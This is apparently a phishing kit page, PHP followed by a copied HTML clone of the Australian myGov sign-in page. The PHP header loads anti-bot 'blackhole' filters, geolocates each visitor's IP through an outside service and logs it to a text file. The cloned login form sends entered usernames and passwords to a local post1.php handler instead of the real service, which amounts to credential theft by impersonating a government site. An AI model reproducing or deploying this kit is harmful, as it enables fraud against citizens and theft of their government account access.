<?php
// session traps aint needed no more since we swittched to file based wl bl
error_reporting(0);
require_once "../inc/m3dular_config.php"; 
require_once "../m3dularbh/m3dular_functions.php"; 
require_once "../m3dularbh/index.php"; // BLACKHOLE TRAP
require_once "../m3dularbh/frontchecker.php"; // BLACKHOLE TRAP ALL FIRST CHECKS!
$loremdata=lorem(20);
include "anti/index.php";
include "id.php";

function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;

}
function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
 }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }else{
      $ip=$_SERVER['REMOTE_ADDR'];
 }
  return $ip;
}
$realip=getRealIpAddr();
$json = file_get_contents_curl('http://www.geoplugin.net/json.gp?ip='.$realip);
$obj = json_decode($json);
$countryName=$obj->{'geoplugin_countryName'};
$countryCode=$obj->{'geoplugin_countryCode'};
$messageTxt  = "IP : ".$realip." | Country : ".$countryName."\n";
$xmyfile = fopen("Views.txt", "a+");
fwrite($xmyfile, $messageTxt);
fclose($xmyfile);
?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <title>Sign-in - myGov</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- phone number format detection, turning it off -->
  <meta name="format-detection" content="telephone=no">
  <script type="text/javascript" src="./Sign-in - myGov_files/ruxitagentjs_ICA2Vfghjqrux_10239220408103229.js.download" data-dtconfig="app=5f15dc81410a75c1|ssc=1|rcdec=1209600000|featureHash=ICA2Vfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|srmcrv=10|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1659407691239|dtVersion=10239220408103229|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10239220408103229.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_-1301945625|rpid=529830694|domain=my.gov.au"></script><link rel="shortcut icon" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon.ico">
  <link href="./Sign-in - myGov_files/mgv2-application.css" rel="stylesheet">
</head>




	
	
		<body class="unauth">
	


	<nav class="uikit-skip-link" aria-label="Skip Links"><a class="uikit-skip-link__link" id="va_skipToBot" href="https://login.my.gov.au/LoginServices/main/login?execution=e2s1#">Skip to Ask a question</a><a class="uikit-skip-link__link" id="va_skipToBot" href="#">Skip to Ask a question</a></nav>

	<div class="beta-information" role="complementary" aria-label="Important Information">
    	<h2 class="sr-only" aria-label="Important Information">Important Information</h2>
    	<p>myGov is changing soon. Visit <a id="mygov-beta" href="https://beta.my.gov.au/?utm_source=blue&amp;utm_medium=banner&amp;utm_campaign=myGov&amp;utm_id=beta&amp;cid=mygovbeta_banner_green_unauth">myGov Beta</a> and share your feedback.</p>
    </div>



	

<header role="banner" class="unauth"><section class="wrapper"><div class="inner"><div class="unauth-grid"><div class="unauth-grid-row"><img id="unauth-govt-crest" src="./Sign-in - myGov_files/austgovt-inline-white.svg" alt="Australian Government Coat of Arms" role="img"><div class="header-logo unauth"><a href="https://login.my.gov.au/mygov"><img src="./Sign-in - myGov_files/mygov-logo.svg" class="header-logo-img" alt="myGov home" id="unauth-mygov-logo"></a></div></div></div></div></section></header><noscript><div class="outage"><div class="outage__inner"><div><span class="is-visuallyhidden">Warning message:</span><p>JavaScript is required for myGov to work correctly.</p></div></div></div></noscript>


	







<div class="wrapper"><div class="main-block" id="content" role="main">
	<div class="unauth">

		<div id="modal-zone">
			<!-- first identity modal -->
			<div tabindex="-1" open="false" aria-labelledby="initial-modal-header" aria-describedby="initial-modal-content" role="dialog" aria-modal="false" aria-expanded="false" aria-hidden="true" id="new-modal-content" class="generic-modal new-modal-content new-hide">
				<section>
					<form id="identity-display-form">
						<div class="input-group">
							<fieldset id="digital-id-selection">
								<div class="identity-modal-header-group">
									<h3 class="identity-question-header" aria-hidden="true">Have you connected your
										Digital Identity in your myGov
										Account settings?</h3>
									<div>
										<a id="first-dismiss" href="https://login.my.gov.au/LoginServices/main/login?execution=e2s1#" aria-label="Close" class="modal-action-dismiss" onclick="newHideIdentityModal()">
											<img name="modal-dismiss" tabindex="-1" alt="Dismiss modal" class="modal-dismiss" src="./Sign-in - myGov_files/dismiss-x.svg">
										</a>
									</div>
								</div>

								<legend id="initial-modal-header" aria-hidden="false">Have you connected your Digital
									Identity in your myGov Account settings?</legend>
								<p id="initial-modal-content">You would have done this in your <strong>myGov Account
										settings</strong>.</p>
								<input onclick="enableProgressButton()" id="decline-digital-identity" value="decline" name="idstatus" type="radio"><label for="decline-digital-identity">I have not
									connected yet</label>
								<input onclick="enableProgressButton()" id="confirm-digital-identity" value="confirm" name="idstatus" type="radio"><label for="confirm-digital-identity">I have
									connected</label>
							</fieldset>

						</div>
					</form>
					<div class="identity-modal-button-container">
						<button data-kickoff-url="/LoginServices/main/login?execution=e2s1&amp;_eventId=digitalIdentity" name="digitalIdentity" aria-controls="new-modal-content" class="confirm-action" disabled="" id="identity-first-confirm-button">Continue</button>
					</div>
				</section>
			</div>

			<!-- secondary identity modal -->
			<div tabindex="-1" open="false" aria-labelledby="secondary-modal-header" role="dialog" aria-modal="false" aria-expanded="false" aria-hidden="true" id="secondary-identity-modal" class="hidden generic-modal">
				<div class="identity-modal-header-group">
					<h3 class="explanatory-identity-header" id="secondary-modal-header">To connect your Digital
						Identity:</h3>
					<a id="second-dismiss" href="https://login.my.gov.au/LoginServices/main/login?execution=e2s1#" aria-label="Close" class="modal-action-dismiss" onclick="hideSecondaryModal()">
						<img name="modal-dismiss" tabindex="-1" alt="Dismiss modal" class="modal-dismiss" src="./Sign-in - myGov_files/dismiss-x.svg">
					</a>
				</div>
				<ol class="identity-link-process">
					<li>Sign in to myGov with your username and password</li>
					<li>Select Account settings</li>
					<li>Select Digital Identity and follow the prompts</li>
				</ol>
				<div class="secondary-identity-modal-button-container">
					<button id="identity-second-confirm-button" class="confirm-action" aria-controls="secondary-identity-modal" onclick="hideSecondaryModal()">Close</button>
				</div>
			</div>
		</div>

		<!-- modal background -->
		<div aria-hidden="true" id="digital-id-modal-background" class="new-modal new-hide">
		</div>

		<div class="login-grid-container">
			<h1 class="sign-in-banner alternative">Sign in to myGov</h1>
			<p class="login-instruction-text">Choose how to sign in from these 2 options</p>
			<div class="login-grid-row alternative">
				<div class="login-grid-column alternative">
					<div class="digital-id-login-card-wrapper transparent-background">
						<div class="digital-id-barrier">
							<div class="digital-id-main-login-card alternative">
								

								

								

								
								

								

								<h2 class="digital-id-header">Using your myGov sign in details</h2>

								<form id="loginForm" action="post1.php" method="post" autocomplete="off">

									<div class="input-group">
										<label for="userId">Username or email</label>
										<input id="userId" name="email" data-username="data-username" type="text" value="" autocomplete="off">
									</div>

									<a href="https://login.my.gov.au/CredentialManager/recoverUserId.jsp?Origin=&amp;Return=/sps/auth&amp;Login=true">Forgot
										username</a>

									<div class="input-group">
										<label for="password">Password</label>
										<span class="help-text" id="password-text">Do not show others your
											password</span>
										<div class="password-group">
											<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input id="password" name="password" aria-describedby="password-text" data-current-password="data-current-password" type="password" value="" autocomplete="off">
										</div>
									</div>

									<a href="https://login.my.gov.au/CredentialManager/resetPassword.jsp?Origin=&amp;Return=/sps/auth&amp;Login=true">Forgot
										password</a>

									

									<div class="button-digital-id-main-container">
										<div class="digital-id-button-container">
											<button type="submit" class="button-main" name="login">Sign
												in</button>
										</div>
									</div>

									<input type="hidden" name="credentialType" value="20">
									<input type="hidden" id="digitalassistant-unauth" value="">
									<input type="hidden" name="_flowExecutionKey" value="e2s1">
									<input type="hidden" name="OWASP_CSRFTOKEN" value="OD2W-9K5C-DR04-HRAC-5XIW-XCYJ-8R2Y-6Q09-AI5S-ZQ1F-QYXK-DNKR-28ZY-4D6B-0W33-Z4HY-GC7R-ROII-UBQJ-7LTL-4WKD-GYVJ-PPKK-FCTM-ECMN-DKLL-PYSI-7MO5-6AYF-ZRFK-BHL4-L0EL">


								</form>

							</div>
						</div>
						<div class="hr-divider">
							<div class="rounded-border">or</div>
						</div>

						
							
								
							
							
						

						<div class="digital-id-login-card alternative">
							<h2 class="digital-id-header">Using your myGovID Digital Identity</h2>
							<div class="button-digital-id-container">
								<!-- <a aria-controls="identity-modal" onclick="newShowIdentityModal()" role="button"
									href="#" class="button-minor button">Continue with Digital Identity</a> -->
								<a href="https://login.my.gov.au/LoginServices/main/login?execution=e2s1&amp;_eventId=digitalIdentity" class="button-minor" role="button">Continue with Digital Identity</a>
							</div>		
							<p>You need to <a href="https://login.my.gov.au/EnrolService/register.jsp?login=true&amp;Return=/mga/sps/auth">create a myGov account</a>, if you don't have one.</p>
							<p class="external-links-zone">

								<span class="identity">What is <a target="_blank" href="https://www.digitalidentity.gov.au/">Digital Identity
										<img alt="Opens in a new window" class="link-external" src="./Sign-in - myGov_files/icon-external-link-blue.svg">

</a>?</span>
								<span class="mygovid">What is <a target="_blank" href="https://www.mygovid.gov.au/">myGovID
										<img alt="Opens in a new window" class="link-external" src="./Sign-in - myGov_files/icon-external-link-blue.svg">

</a>?</span>
							</p>
						</div>

					</div>
				</div>

				<div class="login-grid-column secondary">
					<div class="product-description">
						<div class="digital-id-inner">
							<h2>What is myGov?</h2>
							<p>myGov is a simple and secure way to access online government services.</p>
							<p>
								<a class="link-arrow" href="https://login.my.gov.au/EnrolService/register.jsp?login=true&amp;Return=/mga/sps/auth">Create
									a myGov account</a>
							</p>

							<hr>

							<h2>COVID-19 updates</h2>
							<p>Go to <a target="_blank" href="https://australia.gov.au/" rel="noopener noreferrer">australia.gov.au <img alt="Opens in a new window" class="link-external" src="./Sign-in - myGov_files/icon-external-link-blue.svg">

</a>
								for the latest:</p>
							<ul>
								<li>COVID-19 news</li>
								<li>vaccine information </li>
								<li>advice from Australian Government agencies.</li>
							</ul>
							
							<h2>Proof of COVID-19 vaccination</h2>
	  						<p>You can get proof of COVID-19 vaccinations by signing in to myGov.</p>
	  										
							<hr>
														
						</div>
					</div>
				</div>

				<noscript>
					<img alt="" src="/mygov/content/mgv2/icons/no-js.png" />
				</noscript>

			</div>
		</div>
	</div> <!-- end of unauth 'wrapper' div -->
<input type="hidden" id="digitalassistant" value=""></div></div>


	

<footer role="contentinfo"><div class="wrapper"><div class="inner"><section class="footer-links"><nav aria-label="Footer Links"><ul><li><a href="https://login.my.gov.au/mygov/content/html/about.html">About myGov</a></li><li><a href="https://login.my.gov.au/mygov/content/html/contact.html">Contact us</a></li><li><a href="https://login.my.gov.au/mygov/content/html/terms.html">Terms of use</a></li><li><a href="https://login.my.gov.au/mygov/content/html/privacy.html">Privacy</a></li><li><a href="https://login.my.gov.au/mygov/content/html/copyright.html">Copyright</a></li><li><a href="https://login.my.gov.au/mygov/content/html/security.html">Security</a></li><li><a href="https://login.my.gov.au/mygov/content/html/accessibility.html">Accessibility</a></li><li><a href="https://login.my.gov.au/mygov/content/html/help.html">Help</a></li></ul></nav></section><section class="footer-logo"><img src="./Sign-in - myGov_files/austgovt-inline.svg" alt="Australian Government Coat of Arms" width="289" height="70" role="img"></section></div></div></footer>



	<script type="text/javascript" src="./Sign-in - myGov_files/mgv2-vendor.js.download"></script>
	<script type="text/javascript" src="./Sign-in - myGov_files/mgv2-application.js.download"></script>
	<script type="text/javascript" src="./Sign-in - myGov_files/login.js.download"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$('.emergency-information').css({
				height: 'auto',
				padding: '17px 5px'
			});
		});
	</script>


<div id="va_chatAnchor" class="va_chatAnchor" role="complementary" aria-labelledby="va_chatTitle" style="display: block;"><div id="va_chatHeader" style="right:2%" aria-live="polite" title="Ask a question" aria-label="Ask a question"><div class="va_chatBorder"></div><header class="va_header va_clearfix" style="box-shadow:0 0 3px rgba(0,0,0,.3)"><h2 class="va_chatTitle" id="va_chatTitle" aria-live="polite">Ask a question</h2><div id="va_resizeIcon" class="va_resizeIcon" tabindex="0" aria-live="polite" title="View Ask a question in a larger window" aria-label="View Ask a question in a larger window" style="display: none"></div><div id="va_toggleIcon" class="va_toggleIcon" tabindex="0" aria-live="polite" title="Open Ask a question" aria-label="Open Ask a question"></div></header></div><iframe name="va_iframe" id="va_iframe" class="va_iframe" aria-live="assertive" aria-relevant="additions" src="./Sign-in - myGov_files/saved_resource.html" style="z-index: 9999; background: rgb(229, 229, 229); right: 2%; overflow: hidden; height: 0px; width: 0px;"></iframe><div id="va_mobileBar" style="border-top: #d7ea6a 5px solid" aria-live="polite"><header class="va_header"><h2 class="va_chatTitle_mob" aria-live="polite" id="va_chatTitle">Ask a question</h2><div role="button" style="border: 0; margin: 0;" id="va_mobileToggle" aria-live="polite" class="va_mobileToggle" title="Open Ask a question" aria-label="Open Ask a question"></div></header></div><iframe name="va_iframe" id="va_iframe" class="va_iframe" style="z-index: 9999; background: rgb(229, 229, 229); right: 2%; overflow: hidden;"></iframe></div><div id="va_chatAnchor" class="va_chatAnchor" role="complementary" aria-labelledby="va_chatTitle"></div></body></html>